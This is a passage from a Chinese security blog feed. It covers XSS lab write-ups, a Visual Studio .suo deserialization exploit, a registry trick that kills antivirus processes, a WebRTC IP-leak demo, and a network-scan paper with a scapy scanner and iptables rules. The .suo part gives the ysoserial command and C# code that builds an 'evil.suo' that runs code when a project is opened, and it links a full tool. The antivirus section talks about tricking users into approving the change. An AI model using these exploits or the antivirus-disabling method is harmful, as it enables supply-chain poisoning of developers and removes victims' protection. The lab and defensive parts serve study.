class="hljs-string">&quot;t_ref&quot;</span> value=\<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;\&#x27; type=&quot;hidden&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>编写一个后端跳转代码（什么语言都行，这里用nodejs+express）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">originalUrl</span>);<br>    res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Referrer-Policy&#x27;</span>, <span class="hljs-string">&#x27;unsafe-url&#x27;</span>);<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`</span><br><span class="hljs-string">        &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">        &lt;html&gt;</span><br><span class="hljs-string">        &lt;head&gt;</span><br><span class="hljs-string">            &lt;script&gt;</span><br><span class="hljs-string">                window.location.href = &#x27;http://192.168.235.128/level11.php&#x27;;</span><br><span class="hljs-string">            &lt;/script&gt;</span><br><span class="hljs-string">        &lt;/head&gt;</span><br><span class="hljs-string">        &lt;body&gt;&lt;/body&gt;</span><br><span class="hljs-string">        &lt;/html&gt;</span><br><span class="hljs-string">    `</span>);<br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">80</span>;<br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器运行在 http://localhost:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>访问payload地址，跳转，代码执行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">http://localhost/<span class="hljs-symbol">&#x27;type</span>=<span class="hljs-symbol">&#x27;text</span><span class="hljs-symbol">&#x27;onfocus</span>=<span class="hljs-symbol">&#x27;alert</span>(<span class="hljs-number">1</span>)<span class="hljs-symbol">&#x27;autofocus</span>=&#x27;<br></code></pre></td></tr></table></figure><h1 id="12（self-xss）"><a href="#12（self-xss）" class="headerlink" title="12（self-xss）"></a>12（self-xss）</h1><p>UA注入，self-xss，无意义低风险（如果攻击者能通过社会工程学诱导用户修改UA，那为什么不直接诱导用户执行代码呢），不写了</p><h1 id="13（self-xss）"><a href="#13（self-xss）" class="headerlink" title="13（self-xss）"></a>13（self-xss）</h1><p>cookie注入，self-xss，无意义低风险，不写了</p><h1 id="14"><a href="#14" class="headerlink" title="14"></a>14</h1><p>网站已死，现在访问只能进入一个申必APT组织搭建的钓鱼网站然后下载一个申必圆孔木马，，，</p><p>据推测是exif xss注入，用户上传图片并在前端展示exif信息，和上面的大差不差，常规的标签闭合注入</p><h1 id="15（零点击）"><a href="#15（零点击）" class="headerlink" title="15（零点击）"></a>15（零点击）</h1><p><code>AngularJS</code>的<code>ng-include</code>导致的漏洞</p><p>这不是<code>AngularJS</code>的漏洞，仅仅是<code>ng-include</code>加载了一个带有xss漏洞的其他界面</p><p>上面带xss漏洞的页面随便选一个，使用<code>ng-include</code>加载进来就行。但是需要注意的是，使用<code>ng-include</code>包含文件时，不会执行<code>&lt;script&gt;</code>标签，所以应构造其他非<code>&lt;script&gt;</code>的payload执行代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">level15.php?src=&#x27;level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><h1 id="16（零点击）"><a href="#16（零点击）" class="headerlink" title="16（零点击）"></a>16（零点击）</h1><p>关键词过滤，替换为&nbsp;，不存在大小写绕过，双写绕过，且空格也被过滤</p><p>使用换行绕过，html对换行不敏感，在标签内换行也是可以的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++">level<span class="hljs-number">16.</span>php?keyword=&lt;img%<span class="hljs-number">0</span>asrc=<span class="hljs-number">0</span>%<span class="hljs-number">0</span>aonerror=<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><h1 id="17（零点击）"><a href="#17（零点击）" class="headerlink" title="17（零点击）"></a>17（零点击）</h1><p>最简单的一集，甚至不需要考虑闭合</p><p>只需要移动鼠标就能触发，也算零点击罢（汗</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">level17</span>.php?arg01=a&amp;arg02=b%<span class="hljs-number">20</span>onmousemove=alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h1 id="18（零点击）"><a href="#18（零点击）" class="headerlink" title="18（零点击）"></a>18（零点击）</h1><p>和上面一模一样</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">level18</span>.php?arg01=a&amp;arg02=b%<span class="hljs-number">20</span>onmousemove=alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h1 id="19"><a href="#19" class="headerlink" title="19"></a>19</h1><p>涉及到flash逆向，没有flash，做不了</p><h1 id="20"><a href="#20" class="headerlink" title="20"></a>20</h1><p>同上</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>时隔三月，再谈Visual Studio .suo文件反序列化漏洞</title>
    <link href="/articles/resln/"/>
    <url>/articles/resln/</url>
    
    <content type="html"><![CDATA[<p>2025年1月，某APT组织利用Visual Studio .suo文件反序列化漏洞投毒。</p><p>微软认为，使用Visual Studio打开项目本来就是危险操作，所以他们并不认为这是漏洞，也不会修复（这回复就很微软哈哈哈），时至今日，该漏洞在最新版的Visual Studio中依然能正常利用（分项目类型，部分项目类型不生效，没深入研究）</p><p>该漏洞在被APT组织利用前知名度并不高（虽然非常严重），在2023年就披露出来了，我在2024年编写了一个利用工具，到2025年才有APT组织利用</p><p>使用<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>生成Payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ysoserial -g ClaimsIdentity -f BinaryFormatter -c calc -o base64 -bgc TypeConfuseDelegate<br></code></pre></td></tr></table></figure><p>然后添加一个申必魔数头</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-built_in">byte</span>[] payload_header = &#123; <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;<br></code></pre></td></tr></table></figure><p>使用<a href="https://github.com/ironfede/openmcdf">openmcdf</a>将Payload写入.suo文件</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C#">cf.RootStorage.GetStream(<span class="hljs-string">&quot;VsToolboxService&quot;</span>).SetData(CombineArrays(payload_header, Convert.FromBase64String(payload)));<br><span class="hljs-built_in">string</span> o = Environment.CurrentDirectory + <span class="hljs-string">&quot;\\evil.suo&quot;</span>;<br>cf.SaveAs(o);<br>cf.Close();<br>Console.WriteLine(<span class="hljs-string">&quot;\n\n成功，文件已保存到 &quot;</span> + o);<br></code></pre></td></tr></table></figure><p>替换原有的.suo文件，打开项目，代码执行，利用成功</p><p><img src="/articles/resln/640.png"></p><p>Payload被Base64编码，而且.suo文件以二进制形式存储，也就是说这种方法自带免杀，利用起来非常方便（笑）</p><p>上面的代码不完整，这里有完整利用工具（给个star吧谢谢了）：<a href="https://github.com/Brassinolide/VS_Deserialize_Exploit">https://github.com/Brassinolide/VS_Deserialize_Exploit</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【奇技淫巧】利用BurpSuite的证书bug阻止BurpSuite访问你的网站</title>
    <link href="/articles/noburpsuite/"/>
    <url>/articles/noburpsuite/</url>
    
    <content type="html"><![CDATA[<p>首先需要一个泛域名证书，这里用let’s encrypt的免费泛域名证书</p><p><img src="/articles/noburpsuite/1.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">certbot certonly --manual --preferred-challenges dns -d *.rfc3161.top -d rfc3161.top<br></code></pre></td></tr></table></figure><p>然后创建一个带下划线的DNS记录，解析到你的服务器上</p><p><img src="/articles/noburpsuite/2.png"></p><p>服务器配置强制HTTPS访问</p><p><img src="/articles/noburpsuite/3.png"></p><p>正常用户可以访问网站</p><p><img src="/articles/noburpsuite/4.png"></p><p>而BurpSuite用户访问时会出现ERR_SSL_PROTOCOL_ERROR错误</p><p><img src="/articles/noburpsuite/5.png"></p><p>因为域名中包含下划线是不符合标准的，所以BurpSuite在颁发中间人证书时出现了bug，BurpSuite官方也表态不会进行修复（笑）</p><p><img src="/articles/noburpsuite/6.png"></p><p>要修复这个问题也很简单，BurpSuite颁发的中间人证书是单域名，也改成泛域名就能修复了，但是BurpSuite官方他就是不修啊！（汗）</p><p><img src="/articles/noburpsuite/7.png"></p><p>不过yakit就没有这个问题，能正常颁发带有下划线的中间人证书</p><p><img src="/articles/noburpsuite/8.png"></p><p>来测试一下你的BurpSuite吧🥵：<a href="https://_noburpsuite.rfc3161.top/">https:&#x2F;&#x2F;_noburpsuite.rfc3161.top&#x2F;</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Let&#39;s RFC3161</title>
    <link href="/articles/rfc3161docs/"/>
    <url>/articles/rfc3161docs/</url>
    
    <content type="html"><![CDATA[<p>跳转到：<a href="https://rfc3161.top/">https://rfc3161.top/</a></p><script>(function() {    window.location.href = "https://rfc3161.top/";})();</script>]]></content>
    
    
    <categories>
      
      <category>文档</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>RFC3161</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3环无驱动非漏洞结束任何杀毒软件</title>
    <link href="/articles/ring3killav/"/>
    <url>/articles/ring3killav/</url>
    
    <content type="html"><![CDATA[<p><img src="/articles/ring3killav/mmexport1740807142612.jpg"></p><p>进入CrashControl注册表项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\CrashControl\<br></code></pre></td></tr></table></figure><p>将<code>CrashDumpEnabled</code>的值更改为<code>7</code>（自动内存转储），将<code>DumpFileSize</code>的值更改为<code>1</code>（防止文件过大）</p><p>添加一个字符串键<code>DedicatedDumpFile</code>，值为exe的完整路径，这里用火绒做测试，火绒的核心进程为<code>HipsDaemon.exe</code></p><p><img src="/articles/ring3killav/2.png"></p><p>计算机重启后，火绒就被干烂了</p><p><img src="/articles/ring3killav/1.png"></p><p><strong>火绒可能说明不了什么，上晶核360</strong></p><p>360的核心进程是<code>360Tray.exe</code></p><p>会报恶意操作，所以最重要的是如何忽悠用户允许操作（草</p><p><img src="/articles/ring3killav/3.png"></p><p>重启后，虽然没有了托盘图标，且不会再进行主动防御，但用户还是可以进入安装文件夹手动打开<code>360Safe.exe</code>手动杀毒（360的防御进程和杀毒进程分离，不像火绒就一个进程杀掉就全完蛋，笑）</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解WebRTC泄露</title>
    <link href="/articles/rtcleak/"/>
    <url>/articles/rtcleak/</url>
    
    <content type="html"><![CDATA[<h1 id="WebRTC泄露"><a href="#WebRTC泄露" class="headerlink" title="WebRTC泄露"></a>WebRTC泄露</h1><p>WebRTC（Web Real-Time Communication）允许开发者直接在浏览器中实现点对点（P2P）的音视频通信、数据传输等功能</p><p>一般浏览器默认启用WebRTC（但是一些匿名浏览器如tor浏览器默认禁用），且使用WebRTC不需要经过用户同意，可利用性还是很高的</p><p>如图，我挂了一个香港的代理，并且用WebRTC泄露成功获取了我的真实IP</p><p><img src="/articles/rtcleak/1.png"></p><p><button id="testLeak">点击测试WebRTC泄露</button></p><script>document.getElementById('testLeak').onclick = function() {    function rtcLeak(stun = "stun:stun.l.google.com:19302") {    return new Promise((resolve, reject) => {        const myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection || window.msRTCPeerConnection;        const pc = new myPeerConnection({ iceServers: [{ urls: stun }] });        pc.createDataChannel("");        pc.onicecandidate = (event) => {            if (event && event.candidate && event.candidate.candidate) {                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;                const ipMatch = event.candidate.candidate.match(ipRegex);                if (ipMatch) {                    pc.close();                    resolve(ipMatch[1]);                }            }        };        pc.createOffer()            .then((offer) => pc.setLocalDescription(offer))            .catch((error) => {                reject(error);            });    });}rtcLeak()    .then((ip) => {        alert(ip);    })    .catch((error) => {        alert(error);    });}</script><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">rtcLeak</span>(<span class="hljs-params">stun = <span class="hljs-string">&quot;stun:stun.l.google.com:19302&quot;</span></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> myPeerConnection = <span class="hljs-variable language_">window</span>.<span class="hljs-property">RTCPeerConnection</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozRTCPeerConnection</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitRTCPeerConnection</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">msRTCPeerConnection</span>;<br>        <span class="hljs-keyword">const</span> pc = <span class="hljs-keyword">new</span> <span class="hljs-title function_">myPeerConnection</span>(&#123; <span class="hljs-attr">iceServers</span>: [&#123; <span class="hljs-attr">urls</span>: stun &#125;] &#125;);<br>        pc.<span class="hljs-title function_">createDataChannel</span>(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">//当WebRTC试图建立连接时，它会生成一系列的ICE候选者</span><br>        <span class="hljs-comment">//通过正则表达式匹配这些ICE候选者是否包含IP地址</span><br>        pc.<span class="hljs-property">onicecandidate</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>            <span class="hljs-keyword">if</span> (event &amp;&amp; event.<span class="hljs-property">candidate</span> &amp;&amp; event.<span class="hljs-property">candidate</span>.<span class="hljs-property">candidate</span>) &#123;<br>                <span class="hljs-keyword">const</span> ipRegex = <span class="hljs-regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/</span>;<br>                <span class="hljs-keyword">const</span> ipMatch = event.<span class="hljs-property">candidate</span>.<span class="hljs-property">candidate</span>.<span class="hljs-title function_">match</span>(ipRegex);<br><br>                <span class="hljs-keyword">if</span> (ipMatch) &#123;<br>                    pc.<span class="hljs-title function_">close</span>();<br>                    <span class="hljs-title function_">resolve</span>(ipMatch[<span class="hljs-number">1</span>]);<br>                &#125;<br>            &#125;<br>        &#125;;<br>        pc.<span class="hljs-title function_">createOffer</span>()<br>            .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">offer</span>) =&gt;</span> pc.<span class="hljs-title function_">setLocalDescription</span>(offer))<br>            .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>                <span class="hljs-title function_">reject</span>(error);<br>            &#125;);<br>    &#125;);<br>&#125;<br><br><span class="hljs-title function_">rtcLeak</span>()<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">ip</span>) =&gt;</span> &#123;<br>        <span class="hljs-title function_">alert</span>(ip);<br>    &#125;)<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>    &#125;);<br></code></pre></td></tr></table></figure><h1 id="禁用WebRTC"><a href="#禁用WebRTC" class="headerlink" title="禁用WebRTC"></a>禁用WebRTC</h1><p>禁用WebRTC不仅能防止IP泄露，还能阻止流氓网站偷偷跑PCDN（是的，国内某些大厂的行为，网页都能用来跑PCDN，真是四马了）</p><p>对于非Chrome浏览器，这里有详细步骤：<a href="https://nordvpn.com/zh/blog/jinyong-webrtc/">https://nordvpn.com/zh/blog/jinyong-webrtc/</a></p><p>Chrome浏览器没法直接禁用，必须用插件或油猴脚本实现</p><p>比如谷歌官方的插件：<a href="https://chromewebstore.google.com/detail/webrtc-network-limiter/npeicpdbkakmehahjeeohfdhnlpdklia">https://chromewebstore.google.com/detail/webrtc-network-limiter/npeicpdbkakmehahjeeohfdhnlpdklia</a></p><p>或者油猴脚本：</p><p><img src="/articles/rtcleak/2.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name 禁用WebRTC</span><br><span class="hljs-comment">// @match *://*/*</span><br><span class="hljs-comment">// @version 1</span><br><span class="hljs-comment">// @description 禁用WebRTC</span><br><span class="hljs-comment">// @run-at document-start</span><br><span class="hljs-comment">// @website https://crackme.net/articles/rtcleak</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>[<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;webkit&quot;</span>,<span class="hljs-string">&quot;moz&quot;</span>,<span class="hljs-string">&quot;ms&quot;</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">prefix</span> =&gt;</span> &#123;<br>    [<br>        <span class="hljs-string">&quot;RTCError&quot;</span>,<br>        <span class="hljs-string">&quot;RTCRtpSender&quot;</span>,<br>        <span class="hljs-string">&quot;RTCDTMFSender&quot;</span>,<br>        <span class="hljs-string">&quot;RTCErrorEvent&quot;</span>,<br>        <span class="hljs-string">&quot;RTCTrackEvent&quot;</span>,<br>        <span class="hljs-string">&quot;RTCCertificate&quot;</span>,<br>        <span class="hljs-string">&quot;RTCDataChannel&quot;</span>,<br>        <span class="hljs-string">&quot;RTCRtpReceiver&quot;</span>,<br>        <span class="hljs-string">&quot;RTCStatsReport&quot;</span>,<br>        <span class="hljs-string">&quot;RTCIceCandidate&quot;</span>,<br>        <span class="hljs-string">&quot;RTCIceTransport&quot;</span>,<br>        <span class="hljs-string">&quot;RTCDtlsTransport&quot;</span>,<br>        <span class="hljs-string">&quot;RTCSctpTransport&quot;</span>,<br>        <span class="hljs-string">&quot;RTCPeerConnection&quot;</span>,<br>        <span class="hljs-string">&quot;RTCRtpTransceiver&quot;</span>,<br>        <span class="hljs-string">&quot;RTCDataChannelEvent&quot;</span>,<br>        <span class="hljs-string">&quot;RTCEncodedAudioFrame&quot;</span>,<br>        <span class="hljs-string">&quot;RTCEncodedVideoFrame&quot;</span>,<br>        <span class="hljs-string">&quot;RTCSessionDescription&quot;</span>,<br>        <span class="hljs-string">&quot;RTCDTMFToneChangeEvent&quot;</span>,<br>        <span class="hljs-string">&quot;RTCPeerConnectionIceEvent&quot;</span>,<br>        <span class="hljs-string">&quot;RTCPeerConnectionIceErrorEvent&quot;</span><br>    ].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">rtc</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> obj = prefix + rtc;<br>        <span class="hljs-keyword">if</span> (unsafeWindow[obj]) <span class="hljs-keyword">delete</span> unsafeWindow[obj];<br>    &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文研读《Detecting and deceiving network scans》</title>
    <link href="/articles/antiscan/"/>
    <url>/articles/antiscan/</url>
    
    <content type="html"><![CDATA[<p>论文原文：<a href="https://inai.de/documents/Chaostables.pdf">https://inai.de/documents/Chaostables.pdf</a></p><p><strong>iptables无法实现复杂检测规则，iptables编写的防火墙有较大概率假阳或假阴，不建议在生产环境中使用</strong></p><h1 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h1><p>标准的TCP连接以SYN包开始，其他一切都会被视为异常，隐蔽扫描就是通过构造异常的数据包来进行扫描</p><p>隐蔽扫描非常容易被阻止，只需要简单的丢弃所有异常数据包就可以（一点也不隐蔽，为什么要起这个名字，雾）</p><p>隐蔽扫描同时也非常不可靠，可能在路由上就被丢弃导致无法到达目标，目标也可能全部不响应或全部RST导致误判</p><h2 id="NULL扫描"><a href="#NULL扫描" class="headerlink" title="NULL扫描"></a>NULL扫描</h2><p>NULL扫描的原理是发送一个没有任何标志位的TCP包（RFC-793标准规定：开放端口应忽略没有标志位的数据包）</p><p>NULL扫描无法判断出端口是开放还是被过滤（因为都没有响应）</p><blockquote><p>端口开放，目标主机不会回复<br>端口关闭，目标回复RST-ACK</p></blockquote><p>如果所有标志位都为0，数据包是无效的，路由器、防火墙、操作系统可能会直接丢弃这种数据包，导致NULL扫描无法正常工作</p><p>在我测试过程中，NULL包确实不能到达阿里云上的服务器，只能对内网设备进行扫描</p><p>以下是一个NULL扫描器示例代码，扫描内网的设备</p><p><img src="/articles/antiscan/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>SYN = <span class="hljs-number">0x02</span><br>RST = <span class="hljs-number">0x04</span><br>ACK = <span class="hljs-number">0x10</span><br>SYN_ACK = <span class="hljs-number">0x12</span><br>RST_ACK = <span class="hljs-number">0x14</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">null_scan</span>(<span class="hljs-params">ip:<span class="hljs-built_in">str</span>, port:<span class="hljs-built_in">int</span>, timeout:<span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    ip_pkt = IP(dst = ip)<br>    tcp_pkt = TCP(sport = RandShort()._fix(), dport = port, flags = <span class="hljs-number">0</span>)<br>    response = sr1(ip_pkt / tcp_pkt, timeout = timeout, verbose = <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">elif</span> response.haslayer(TCP):<br>        <span class="hljs-keyword">if</span> response.getlayer(TCP).flags == RST_ACK:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">f&quot;未知flags：<span class="hljs-subst">&#123;flags&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8889</span>,<span class="hljs-number">39001</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> null_scan(<span class="hljs-string">&quot;192.168.0.1&quot;</span>, i):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> 开放/过滤&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> 关闭&quot;</span>)<br>    <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>iptables阻止NULL扫描：</p><p>既然NULL数据包是无效的，那直接全部丢弃就行，也不用怕丢错导致网络出现问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-A INPUT -p tcp --tcp-flags ALL NONE -j DROP<br></code></pre></td></tr></table></figure><h2 id="FIN扫描、XMAS扫描和ACK扫描"><a href="#FIN扫描、XMAS扫描和ACK扫描" class="headerlink" title="FIN扫描、XMAS扫描和ACK扫描"></a>FIN扫描、XMAS扫描和ACK扫描</h2><p>FIN扫描原理和NULL扫描原理类似，但是只设置FIN标志位</p><p>XMAS扫描同理，设置FIN、URG和PSH标志位</p><p>ACK扫描同理，只设置ACK标志位</p><p>此处不再提供示例代码</p><h2 id="iptables阻止隐蔽扫描"><a href="#iptables阻止隐蔽扫描" class="headerlink" title="iptables阻止隐蔽扫描"></a>iptables阻止隐蔽扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">tcp_inval链</span><br>-N tcp_inval;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 